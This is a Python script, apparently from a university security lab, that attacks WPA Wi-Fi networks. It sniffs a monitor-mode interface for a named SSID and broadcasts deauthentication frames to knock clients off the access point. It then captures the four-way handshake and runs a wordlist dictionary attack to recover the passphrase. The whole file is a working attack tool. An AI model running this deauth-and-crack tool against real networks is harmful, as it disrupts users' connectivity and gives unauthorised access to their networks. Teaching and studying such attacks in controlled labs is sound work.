#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Dictionary attack on passphrase derived from the 4-way handshake info, 
uses an interface in monitor mode to sniff packets
"""

__author__      = "Diego Villagrasa, Fabio Marques"
__copyright__   = "Copyright 2021, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "diego.villagrasa@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex, hexlify
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap") 

# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "Pairwise key expansion" #this string is used in the pseudo-random function

ssid        = "SSwisscom"
APmac       = ""
Clientmac   = ""

# Authenticator and Supplicant Nonces
# todo: documenter
ANonce      = ""
# todo: documenter
SNonce      = ""

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
# todo: documenter
mic_to_test = ""

data = ""

# keep track of which message we have received
msg = 0b000

# Should continue sniffing
snf= True

"""
    This function cracks the passphrase using a dictionary attack
"""
def crack():
    global ssid, APmac, Clientmac, ANonce, SNonce, mic_to_test, data, sniff, A
    print ("\n\nValues used to derivate keys")
    print ("============================")
    print ("SSID: ",ssid,"\n")
    print ("AP Mac: ",APmac.encode(),"\n")
    print ("Cient Mac: ",Clientmac.encode(),"\n")
    print ("AP Nonce: ",ANonce,"\n")
    print ("Client Nonce: ",SNonce,"\n")
    print ("Mic: ",mic_to_test,"\n")

    B = min(a2b_hex(APmac),a2b_hex(Clientmac))+max(a2b_hex(APmac),a2b_hex(Clientmac))+min(a2b_hex(ANonce),a2b_hex(SNonce))+max(a2b_hex(ANonce),a2b_hex(SNonce))
    
    # Load the wordlist and iterate over it
    with open("wordlist.txt") as f:
        while(True):
            passPhrase  = f.readline().replace("\n", "")

            if passPhrase == "":
                break

            #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
            passPhrase = str.encode(passPhrase)
            
            pmk = pbkdf2(hashlib.sha1,passPhrase,ssid.encode(), 4096, 32)

            #expand pmk to obtain PTK
            ptk = customPRF512(pmk,str.encode(A),B)

            #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
            mic = hmac.new(ptk[0:16],data,hashlib.sha1)


            print ("\nResults of the key expansion")
            print ("=============================")
            print ("Passphrase: ",passPhrase,"\n")
            print ("PMK:\t\t",pmk.hex(),"\n")
            print ("PTK:\t\t",ptk.hex(),"\n")
            print ("KCK:\t\t",ptk[0:16].hex(),"\n")
            print ("KEK:\t\t",ptk[16:32].hex(),"\n")
            print ("TK:\t\t",ptk[32:48].hex(),"\n")
            print ("MICK:\t\t",ptk[48:64].hex(),"\n")
            print ("MIC:\t\t",mic.digest()[:-4],"\n")
            print ("ORIG MIC:\t",mic_to_test,"\n")

            # Check if the calculated mic is the same as the mic
            if mic_to_test == mic.digest()[:-4]:
                print("Found Passphrase: ", passPhrase.decode())
                exit(0)

    print("Could not find passphrase")

"""
    This function extracts information from the 4-way handshake to help crack the passphrase
"""
def process(pkt):
    global ssid, APmac, Clientmac, ANonce, SNonce, mic_to_test, data, snf, msg
    if not snf:
        return

    # Empty values to compare to
    emptyNONCE = b"0000000000000000000000000000000000000000000000000000000000000000"
    emptyMIC = b"00000000000000000000000000000000"
    
    # Check if we have a 802.11 packet and haven't found the WiFi mac yet
    if pkt.haslayer(Dot11Beacon) and APmac == "":
        try:

            # Check if the packet contains the right ssid 
            if pkt.info.decode('ascii') == ssid:

                #Register the mac of the ap
                APmac = pkt[Dot11].addr2.replace(":", "")
                print("Found SSID MAC", APmac)
                
                # Sends deauth packets once we have the mac
                print("Deauth")
                deauth = RadioTap() / Dot11(type=0, subtype=12, addr1="FF:FF:FF:FF:FF:FF", addr2="A0:B5:49:0E:55:F9", addr3="A0:B5:49:0E:55:F9") / Dot11Deauth(reason=7)
                sendp(deauth, inter=0.1, count=50, iface="wlan0mon")
                
        except Exception:
            pass
    
    # Check foe EAPOL packet
    if pkt.haslayer(EAPOL):
        src = pkt[Dot11].addr2.replace(":", "")
        dst = pkt[Dot11].addr1.replace(":", "")
        to_DS = pkt[Dot11].FCfield & 0x1 !=0
        from_DS = pkt[Dot11].FCfield & 0x2 !=0

        # If the packet id from DS
        if from_DS == True and src == APmac:
            nonce = hexlify(pkt[Raw].load)[26:90]
            mic = hexlify(pkt[Raw].load)[154:186]

            # If we have a nonce and an empty mac we have the first message
            if nonce != emptyNONCE and mic == emptyMIC:
                APmac = src; Clientmac = dst
                print("M1")
                ANonce = nonce
                msg |= 0b001
            
            # Else if the client and ap are the right ones and we have a mic and a nonce it's the message 3
            elif src == APmac and dst == Clientmac and nonce != emptyNONCE and mic != emptyMIC:
                print("M3")

        # Else if it's to DS
        elif to_DS == True and dst == APmac:
            nonce = hexlify(pkt[Raw].load)[26:90]
            mic = hexlify(pkt[Raw].load)[154:186]

            # If the client and ap are the right and we have a nonce and a mic we have the second message
            if src == Clientmac and dst == APmac and nonce != emptyNONCE and mic != emptyMIC:
                print("M2")
                SNonce = nonce
                msg |= 0b010

            # Else if the client and ap are the right and we have no nonce and a mic we have the 4th message
            elif src == Clientmac and dst == APmac and nonce == emptyNONCE and mic != emptyMIC:
                print("M4")
                mic_to_test = a2b_hex(mic)
                data = raw(pkt[EAPOL]).replace(mic_to_test, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
                msg |= 0b100

    ### This part is a fix for parsing packets in Windows ###
    # This is the same process as the code above

    # Check for association request
    elif pkt.haslayer(Dot11AssoReq):
        # the mac is broken here for some reason so we have to get it manualy
        dst = ''.join('%02x' % b for b in raw(pkt)[18:24])
        src = ''.join('%02x' % b for b in raw(pkt)[24:30])
        to_DS = raw(pkt)[15] & 0x1 !=0
        if to_DS == True and dst == APmac:
            nonce = hexlify(pkt.payload.payload[2].info[18:18+32])
            mic = hexlify(pkt.payload.payload.payload.payload.info[82:82+16])
            if src == Clientmac and dst == APmac and nonce != emptyNONCE and mic != emptyMIC:
                print("M2")
                SNonce = nonce
            elif src == Clientmac and dst == APmac and nonce == emptyNONCE and mic != emptyMIC:
                print("M4")
                mic_to_test = a2b_hex(mic)
                data = pkt.payload.payload.payload.payload.info[1:].replace(mic_to_test, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')

    # Check if we have all the messages we need
    if msg & 0b111 == 0b111:
        print("SNIFF Complete")
        snf = False
        crack()

# Start sniffing on interface wlan0mon
sniff(iface="wlan0mon", prn=process)
